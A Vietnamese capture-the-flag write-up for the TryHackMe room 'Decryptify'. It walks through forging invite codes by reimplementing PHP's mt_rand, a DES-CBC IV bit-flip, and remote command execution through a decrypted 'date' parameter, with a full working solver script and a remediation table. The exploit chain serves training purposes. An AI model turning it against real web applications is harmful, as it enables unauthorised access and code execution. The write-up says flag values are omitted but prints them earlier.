# Decryptify

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/decryptify |
| **Độ khó** | Medium |
| **Chủ đề** | Web, Crypto, RCE |
| **Ngày** | 14/06/2026 |

---

## Mô tả

Ứng dụng web "Decryptify" chạy trên cổng 1337 — một hệ thống đăng nhập bằng invite code, có dashboard mã hóa command bằng DES. Challenge gồm 7 bước nối tiếp nhau:

1. Deobfuscate JavaScript → lấy API key
2. Đọc API docs → hiểu thuật toán tạo invite code
3. Đọc log file → lấy known-plaintext để tìm hằng số ẩn
4. Crack constant → tính invite code → đăng nhập → **Flag 1**
5. Phân tích tham số `date` trên dashboard → phát hiện lỗ hổng CBC bit-flip
6. Dùng 8-ký-tự RCE để đọc PHP source → tìm DES key hardcoded
7. Mã hóa trực tiếp command bằng key lấy được → **Flag 2**

---

## Trinh sát

### Quét cổng

```bash
nmap -sV -Pn 10.48.149.3
```

Kết quả chỉ có một cổng mở: **1337/TCP** chạy Apache. Toàn bộ challenge nằm trên web.

### Khám phá web

Truy cập `http://10.48.149.3:1337` trước, xem bằng tay:

- Trang chủ là form đăng nhập, có **2 tab**: "Login" và "Login with Invite Code". Tab 2 mới là cái hoạt động — cần field `invite_username` và `invite_code`.
- Mở DevTools → Sources → thấy `/js/api.js` đang được load.
- Xem page source → có reference tới `/api.php`.

Sau đó dùng fuzzer để tìm thêm:

```bash
ffuf -u http://10.48.149.3:1337/FUZZ \
  -w /path/to/SecLists/Discovery/Web-Content/common.txt \
  -e .php,.txt,.js,.log \
  -mc 200,301,302,403 -s
```

| Path | Ghi chú |
|------|---------|
| `/index.php` | Trang đăng nhập |
| `/dashboard.php` | Redirect về login nếu chưa auth |
| `/api.php` | Tài liệu API (yêu cầu password) |
| `/js/api.js` | JavaScript bị obfuscate |
| `/logs/app.log` | **Log file bị lộ ra ngoài** |

Hai phát hiện quan trọng nhất: `api.js` chứa secret bị che giấu, và `logs/app.log` bị public.

---

## Khai thác

### Bước 1 — Deobfuscate JavaScript để lấy API key

Mở `/js/api.js` — toàn bộ code là một đống ký tự hex và hàm lồng nhau. Đây là kiểu obfuscation phổ biến dùng **array-index rotation**: tất cả string thật sự được nhét vào một mảng lớn, sau đó truy cập bằng index xáo trộn.

Cách nhanh nhất để giải: paste toàn bộ code vào **browser DevTools console** hoặc chạy bằng Node.js, rồi thêm `console.log` vào cuối để in ra các biến quan trọng. Khi chạy xong, bạn sẽ thấy một chuỗi trông như password: `H7gY2tJ9wQzD4rS1`.

Kiểm tra ngay bằng cách POST lên `/api.php`:

```bash
curl -s -X POST http://10.48.149.3:1337/api.php \
  -d 'api_password=H7gY2tJ9wQzD4rS1'
```

API docs xuất hiện — có đoạn PHP code giải thích cách tạo invite code.

---

### Bước 2 — Đọc API docs để hiểu cách tạo invite code

Đoạn code trong API docs như sau:

```php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);                    // độ dài email
    $email_hex    = hexdec(substr($email, 0, 8));      // hexdec của 8 ký tự đầu
    $seed_value   = hexdec($email_length + $constant_value + $email_hex);
    return $seed_value;
}

$seed_value  = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);       // seed PHP random
$random      = mt_rand();    // lấy 1 số ngẫu nhiên
$invite_code = base64_encode($random);  // base64 số đó
```

Tóm lại: invite code = `base64(mt_rand(seed))` với seed được tính từ email.

Có 2 điều cần hiểu rõ trước khi code:

**Điều 1 — `$constant_value` là ẩn số**, chưa biết giá trị. Cần brute-force.

**Điều 2 — Hàm `hexdec()` của PHP bỏ qua ký tự không phải hex** (thay vì dừng lại như C/Python):

```
# Python thông thường: int("hello", 16) → lỗi
# PHP: hexdec("hello@fa") → bỏ qua 'h','l','l','o','@' → đọc 'e','f','a' → 0xefa = 3834
```

Đây là quirk quan trọng khi implement lại để brute-force constant.

---

### Bước 3 — Đọc log file để tìm hằng số ẩn

Truy cập trực tiếp:

```
http://10.48.149.3:1337/logs/app.log
```

Log ghi lại toàn bộ hoạt động của app, bao gồm:

```
2025-01-23 14:34:20 - User POST to /index.php
    (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:38:40 - User POST to /dashboard.php
    (New user created: hello@fake.thm)
```

Ta có **known-plaintext**: email `alpha@fake.thm` tạo ra invite code `MTM0ODMzNzEyMg==`. Decode base64:

```python
import base64
base64.b64decode('MTM0ODMzNzEyMg==')  # → b'1348337122'
```

Vậy `mt_rand(seed)` phải trả về `1348337122`. Brute-force `constant_value` cho tới khi khớp:

```python
def php_hexdec(s):
    """
    Giống hexdec() của PHP: bỏ qua ký tự không phải hex, không dừng lại.
    Ví dụ: php_hexdec("hello@fa") = 0xefa = 3834
    """
    val = 0
    for c in str(s).lower():
        if '0' <= c <= '9':
            val = val * 16 + int(c)
        elif 'a' <= c <= 'f':
            val = val * 16 + (ord(c) - 87)
        # ký tự khác: bỏ qua (đây là điểm khác biệt so với Python/C)
    return val


def calculate_seed(email, constant):
    el = len(email)
    eh = php_hexdec(email[:8])
    return php_hexdec(el + constant + eh)
    # Lưu ý: el + constant + eh là phép cộng số học thông thường,
    # sau đó kết quả đó lại được đưa vào hexdec() một lần nữa.


def mt_rand(seed):
    """
    Mô phỏng mt_rand() của PHP 7.1+ (dùng thuật toán seeding mới).
    PHP 7.1 đổi từ seeding cũ sang: s[i] = 1812433253 * (s[i-1] ^ (s[i-1]>>30)) + i
    """
    N, M = 624, 397
    MATRIX_A = 0x9908b0df
    UPPER_MASK = 0x80000000
    LOWER_MASK = 0x7fffffff

    # Bước 1: khởi tạo state array
    state = [0] * N
    state[0] = seed & 0xFFFFFFFF
    for i in range(1, N):
        prev = state[i - 1]
        state[i] = (1812433253 * (prev ^ (prev >> 30)) + i) & 0xFFFFFFFF

    # Bước 2: twist (tạo ra block đầu tiên)
    mag = [0, MATRIX_A]
    for k in range(N - M):
        y = (state[k] & UPPER_MASK) | (state[k + 1] & LOWER_MASK)
        state[k] = state[k + M] ^ (y >> 1) ^ mag[y & 1]
    for k in range(N - M, N - 1):
        y = (state[k] & UPPER_MASK) | (state[k + 1] & LOWER_MASK)
        state[k] = state[k + M - N] ^ (y >> 1) ^ mag[y & 1]
    y = (state[N - 1] & UPPER_MASK) | (state[0] & LOWER_MASK)
    state[N - 1] = state[M - 1] ^ (y >> 1) ^ mag[y & 1]

    # Bước 3: temper (lấy output đầu tiên)
    y = state[0]
    y ^= y >> 11
    y ^= (y << 7) & 0x9d2c5680
    y ^= (y << 15) & 0xefc60000
    y ^= y >> 18
    return y >> 1  # PHP mt_rand() shift phải 1 bit


# Brute-force hằng số
TARGET = 1348337122  # mt_rand cho alpha@fake.thm
for const in range(1, 200000):
    seed = calculate_seed('alpha@fake.thm', const)
    if mt_rand(seed) == TARGET:
        print(f'Tìm được constant_value = {const}')
        break
```

Kết quả: **`constant_value = 99999`**.

Xác minh thêm với `hello@fake.thm` (email thứ 2 trong log). Từ log, user `hello@fake.thm` đã tạo account nên chắc chắn có invite code. Tính thử:

```python
def get_invite_code(email, constant=99999):
    seed = calculate_seed(email, constant)
    rand = mt_rand(seed)
    return base64.b64encode(str(rand).encode()).decode()

print(get_invite_code('hello@fake.thm'))  # NDYxNTg5ODkx
```

---

### Bước 4 — Đăng nhập lấy Flag 1

Form đăng nhập có 2 tab. Tab 1 dùng `username` + `invite_code` (không hoạt động đúng). **Tab 2** dùng field `invite_username` + `invite_code` — đây là cái hoạt động.

```python
import urllib.request, urllib.parse, http.cookiejar

TARGET = 'http://10.48.149.3:1337'

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

# Đăng nhập với invite code đã tính
data = urllib.parse.urlencode({
    'invite_username': 'hello@fake.thm',
    'invite_code':     'NDYxNTg5ODkx'
}).encode()

resp = opener.open(urllib.request.Request(TARGET + '/index.php', data=data, method='POST'))

# Lấy dashboard
dashboard = opener.open(TARGET + '/dashboard.php').read().decode()
print(dashboard[:500])  # → thấy THM{CryptographyPwn007}
```

**Flag 1: `THM{CryptographyPwn007}`**

---

### Bước 5 — Phân tích tham số `date` trên dashboard

Sau khi đăng nhập, URL của dashboard có dạng:

```
/dashboard.php?date=7NvaHnWuUB+XvECphMLwy9JNT/7oOoHF35fLHYjpMO0=
```

Tham số `date` trông như một chuỗi base64. Decode thử:

```python
import base64
raw = base64.b64decode('7NvaHnWuUB+XvECphMLwy9JNT/7oOoHF35fLHYjpMO0=')
print(len(raw))   # → 32 bytes
print(raw.hex())  # → ecdbda1e75ae501fd24d4ffee83a81c5df97cb1d88e930ed...
```

32 bytes = IV + ciphertext. Điều này gợi ý **block cipher ở chế độ CBC**. Quan trọng hơn: nếu server giải mã tham số này và chạy kết quả như một lệnh (vì tên là `date`), thì đây là **RCE qua mã hóa**.

#### Tại sao CBC bit-flip hoạt động?

Trong CBC, khối plaintext đầu tiên được tính bằng:

```
P_1 = Cipher_decrypt(CT_1) XOR IV
```

Nếu ta thay đổi từng byte của `IV`, ta kiểm soát được từng byte của `P_1`. Đây là **CBC bit-flip attack** — không cần biết key, chỉ cần biết plaintext gốc.

**Công thức bit-flip:**
```
new_IV[i] = old_IV[i] XOR original_plaintext[i] XOR desired_plaintext[i]
```

Ý nghĩa: XOR ngược byte gốc ra, XOR byte muốn vào. Cipher_decrypt(CT_1) không đổi, nên kết quả cuối đúng bằng `desired_plaintext[i]`.

#### Giới hạn 8 byte

Khi server decrypt, output có dạng `lệnh + padding`. Hàm `unpad()` strip padding, giữ lại phần lệnh. Vì đây là DES-CBC (block size = 8 byte), phần lệnh bị giới hạn **8 ký tự** nếu chỉ dùng bit-flip.

Để biết plaintext gốc là gì, ta cần thử từng lệnh. Ở đây, `original[i]` là `date +%Y` (8 byte — đây là lệnh mặc định server dùng để hiển thị năm trên dashboard).

```python
import base64, urllib.parse, re, html

TARGET = 'http://10.48.149.3:1337'
orig_b64 = '7NvaHnWuUB+XvECphMLwy9JNT/7oOoHF35fLHYjpMO0='

raw      = base64.b64decode(orig_b64)
iv       = bytearray(raw[:8])    # IV: 8 byte đầu (DES IV size = 8)
ct       = bytearray(raw[8:])    # ciphertext: 24 byte còn lại

original = b'date +%Y'           # lệnh gốc server đang chạy

def run_8char_cmd(cmd, opener):
    """
    Chạy lệnh tối đa 8 ký tự bằng CBC bit-flip.
    Phải đang có session hợp lệ trong opener.
    """
    assert len(cmd) == 8, f"Lệnh phải đúng 8 ký tự, got: {len(cmd)}"
    desired = bytearray(cmd.encode())
    new_iv  = bytearray(8)
    for i in range(8):
        new_iv[i] = iv[i] ^ original[i] ^ desired[i]

    modified = base64.b64encode(bytes(new_iv) + bytes(ct)).decode()
    url = TARGET + '/dashboard.php?date=' + urllib.parse.quote(modified, safe='')

    with opener.open(url) as r:
        page = r.read().decode('utf-8', errors='ignore')

    match = re.search(r'<strong>(.*?)</strong>', page, re.DOTALL)
    return html.unescape(match.group(1).strip()) if match else ''
```

#### Dùng 8-byte RCE để đọc PHP source

Lệnh `cat *php` vừa đúng 8 ký tự. Trong bash, `*php` khớp tất cả file kết thúc bằng `php` trong thư mục hiện tại — tức là toàn bộ PHP files của ứng dụng:

```python
# opener đang có session của hello@fake.thm
php_source = run_8char_cmd('cat *php', opener)
print(php_source[:3000])
```

Output là source code của `api.php`, `dashboard.php`, `index.php` nối liền nhau.

---

### Bước 6 — Tìm DES key trong PHP source

Trong `dashboard.php`, có đoạn:

```php
$key  = "1234567890abcdef"; // ghi chú "Same 16-byte key" — thực ra không dùng ở đâu
$pass = 'tryhack1';         // ← đây mới là key thực sự dùng để encrypt/decrypt

function encryptString($unencryptedText, $passphrase) {
    $iv   = random_bytes(openssl_cipher_iv_length('DES-CBC'));  // random IV, 8 bytes
    $text = pad($unencryptedText, 8);  // thêm PKCS5 padding thủ công
    $enc  = openssl_encrypt($text, 'DES-CBC', $passphrase, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $enc);  // trả về base64(IV + ciphertext)
}

function decryptString($encryptedText, $passphrase) {
    $encrypted = base64_decode($encryptedText);
    $iv_size   = openssl_cipher_iv_length('DES-CBC');  // = 8
    $iv        = substr($encrypted, 0, $iv_size);
    $ciphertext= substr($encrypted, $iv_size);
    $dec = openssl_decrypt($ciphertext, 'DES-CBC', $passphrase, OPENSSL_RAW_DATA, $iv);
    // openssl_decrypt tự strip PKCS7 padding → trả về plaintext
    $str = unpad($dec);  // strip manual PKCS5 padding thêm lần 2
    return $str;
}

if (isset($_GET['date'])) {
    $resp   = decryptString($_GET['date'], $pass);  // decrypt tham số date
    $output = shell_exec($resp);                    // ← chạy thẳng làm command!
}
```

**Kết luận quan trọng:**
- Cipher là **DES-CBC** (không phải AES như đoán ban đầu)
- Key là **`tryhack1`** — hardcoded ngay trong source
- Server decrypt tham số `date` rồi `shell_exec()` kết quả → **RCE không giới hạn** nếu biết key

---

### Bước 7 — Mã hóa trực tiếp command → Flag 2

Biết key `tryhack1` → mã hóa bất kỳ command nào, không còn bị giới hạn 8 ký tự nữa.

Cần hiểu cơ chế double-padding của PHP để tránh lỗi:

1. `encryptString()` gọi `pad(cmd, 8)` thêm PKCS5 thủ công
2. `openssl_encrypt()` lại thêm PKCS7 padding một lần nữa tự động
3. Khi decrypt: `openssl_decrypt()` strip lớp PKCS7 → còn lại `cmd + PKCS5`
4. `unpad()` strip lớp PKCS5 → còn lại `cmd`

Khi tự mã hóa bằng Python: chỉ thêm PKCS5 một lần, `openssl_decrypt` sẽ nhận ra đó là PKCS7 hợp lệ và strip luôn, `unpad()` thấy command kết thúc bằng ký tự ASCII thường nên không strip thêm gì.

```python
import os, base64, urllib.parse, re, html
from Cryptodome.Cipher import DES

KEY = b'tryhack1'

def encrypt_command(cmd):
    """
    Mã hóa shell command bằng DES-CBC với key tryhack1.
    Server sẽ decrypt và shell_exec() kết quả.
    """
    # Thêm PKCS5 padding (block size = 8)
    pad_len = 8 - (len(cmd) % 8)
    padded  = cmd.encode() + bytes([pad_len] * pad_len)
    # Random IV mới mỗi lần
    iv = os.urandom(8)
    cipher = DES.new(KEY, DES.MODE_CBC, iv)
    ct = cipher.encrypt(padded)
    return base64.b64encode(iv + ct).decode()


def run_any_cmd(cmd, opener):
    """Chạy command tùy ý độ dài (không còn giới hạn 8 byte)."""
    enc_date = encrypt_command(cmd)
    url = TARGET + '/dashboard.php?date=' + urllib.parse.quote(enc_date, safe='')
    with opener.open(url) as r:
        page = r.read().decode('utf-8', errors='ignore')
    match = re.search(r'<strong>(.*?)</strong>', page, re.DOTALL)
    return html.unescape(match.group(1).strip()) if match else ''


# Đọc flag
print(run_any_cmd('cat /home/ubuntu/flag.txt', opener))
```

**Flag 2: `THM{GOT_COMMAND_EXECUTION001}`**

---

### Script hoàn chỉnh

Toàn bộ quá trình từ đầu đến cuối trong một file:

```python
#!/usr/bin/env python3
"""
Decryptify — TryHackMe challenge solver
Yêu cầu: pip install pycryptodomex
"""
import base64, os, urllib.request, urllib.parse, http.cookiejar, re, html
from Cryptodome.Cipher import DES

TARGET = 'http://10.48.149.3:1337'

# ─── Phần 1: Tính invite code ───────────────────────────────────────────────

def php_hexdec(s):
    val = 0
    for c in str(s).lower():
        if '0' <= c <= '9':   val = val * 16 + int(c)
        elif 'a' <= c <= 'f': val = val * 16 + (ord(c) - 87)
    return val

def calculate_seed(email, constant=99999):
    return php_hexdec(len(email) + constant + php_hexdec(email[:8]))

def mt_rand(seed):
    N, M = 624, 397
    A = 0x9908b0df; U = 0x80000000; L = 0x7fffffff
    s = [0] * N
    s[0] = seed & 0xFFFFFFFF
    for i in range(1, N):
        p = s[i-1]; s[i] = (1812433253 * (p ^ (p >> 30)) + i) & 0xFFFFFFFF
    mag = [0, A]
    for k in range(N - M):
        y = (s[k] & U) | (s[k+1] & L); s[k] = s[k+M] ^ (y >> 1) ^ mag[y & 1]
    for k in range(N - M, N - 1):
        y = (s[k] & U) | (s[k+1] & L); s[k] = s[k+M-N] ^ (y >> 1) ^ mag[y & 1]
    y = (s[N-1] & U) | (s[0] & L); s[N-1] = s[M-1] ^ (y >> 1) ^ mag[y & 1]
    y = s[0]; y ^= y >> 11; y ^= (y << 7) & 0x9d2c5680
    y ^= (y << 15) & 0xefc60000; y ^= y >> 18
    return y >> 1

def get_invite_code(email):
    rand = mt_rand(calculate_seed(email))
    return base64.b64encode(str(rand).encode()).decode()

# ─── Phần 2: Đăng nhập ──────────────────────────────────────────────────────

jar    = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

invite = get_invite_code('hello@fake.thm')
print(f'[*] Invite code cho hello@fake.thm: {invite}')

data = urllib.parse.urlencode({
    'invite_username': 'hello@fake.thm',
    'invite_code':     invite
}).encode()
opener.open(urllib.request.Request(TARGET + '/index.php', data=data, method='POST'))
print('[+] Đã đăng nhập')

# ─── Phần 3: RCE qua DES-CBC ────────────────────────────────────────────────

KEY = b'tryhack1'

def encrypt_command(cmd):
    pad_len = 8 - (len(cmd) % 8)
    padded  = cmd.encode() + bytes([pad_len] * pad_len)
    iv      = os.urandom(8)
    ct      = DES.new(KEY, DES.MODE_CBC, iv).encrypt(padded)
    return base64.b64encode(iv + ct).decode()

def run_cmd(cmd):
    enc  = encrypt_command(cmd)
    url  = TARGET + '/dashboard.php?date=' + urllib.parse.quote(enc, safe='')
    with opener.open(url) as r:
        page = r.read().decode('utf-8', errors='ignore')
    match = re.search(r'<strong>(.*?)</strong>', page, re.DOTALL)
    return html.unescape(match.group(1).strip()) if match else '(no output)'

# ─── Lấy flag ────────────────────────────────────────────────────────────────

print(f'[+] Flag 1 (từ dashboard):')
dashboard = opener.open(TARGET + '/dashboard.php').read().decode()
m = re.search(r'THM\{[^}]+\}', dashboard)
if m: print(f'    {m.group()}')

print(f'[+] Flag 2 (từ /home/ubuntu/flag.txt):')
print(f'    {run_cmd("cat /home/ubuntu/flag.txt")}')
```

---

## Leo thang đặc quyền

Không cần thiết. Cả hai cờ đọc được dưới quyền `www-data`. File `/home/ubuntu/flag.txt` được đặt world-readable nên không cần leo thêm.

---

## Cờ

> Giá trị thực không được ghi vào write-up.

| Cờ | Vị trí | Cách lấy |
|----|--------|----------|
| Flag 1 | Hiển thị trên dashboard sau khi đăng nhập | Tính invite code bằng PHP MT19937 |
| Flag 2 | `/home/ubuntu/flag.txt` | Encrypt trực tiếp command bằng DES key lộ trong source |

---

## Bài học

| Lỗ hổng | Gốc rễ | Cách fix |
|---------|--------|----------|
| API key trong JS | Secret hardcode ở client-side, chỉ che bằng obfuscation (dễ reverse) | Không để secret ở frontend; dùng server-side auth |
| Log file public | `/logs/` không bị chặn, log chứa invite code của user thật | Để log ngoài web root hoặc chặn bằng `.htaccess` |
| Invite code có thể tính lại | Seed của MT19937 tính từ email (deterministic, không có randomness thật) | Dùng `random_bytes()` để tạo token; không seed PRNG từ thông tin public |
| PHP `hexdec()` bỏ qua ký tự lạ | Email `hello@fake.thm` cho hexdec value không trực quan, dễ tính sai | Validate input trước khi dùng, không dựa vào implicit conversion |
| DES key hardcoded trong source | `$pass = 'tryhack1'` nằm thẳng trong PHP file | Dùng environment variable hoặc secret manager |
| DES đã lỗi thời | 56-bit key đã bị crack từ 1998 | Dùng AES-256-GCM |
| `shell_exec()` với input từ HTTP | Server decrypt tham số rồi chạy thẳng làm command, không có whitelist | Không bao giờ exec() output của decrypt; dùng whitelist lệnh cụ thể |
